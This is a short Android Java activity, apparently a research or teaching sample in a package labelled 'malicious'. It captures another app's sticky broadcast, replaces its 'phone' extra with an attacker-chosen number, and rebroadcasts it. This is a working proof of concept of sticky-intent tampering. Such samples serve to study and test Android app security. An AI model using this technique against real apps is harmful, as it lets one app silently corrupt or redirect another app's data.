package edu.ksu.cs.malicious;

import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.widget.Toast;

public class MalActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_mal);
    }

    @Override
    protected void onResume() {
        super.onResume();
        Intent i = registerReceiver(null, new IntentFilter("santos.cs.ksu.edu.benign.MyReceiver"));
        if (i == null) {
            Toast.makeText(getApplicationContext(), "not sticky", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(getApplicationContext(), "sticky", Toast.LENGTH_SHORT).show();
            i.putExtra("phone", "1800-123-0000");
            Toast.makeText(getApplicationContext(), "Intent data = " + i.getStringExtra("phone"), Toast.LENGTH_SHORT).show();
            sendStickyBroadcast(i);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
    }
}
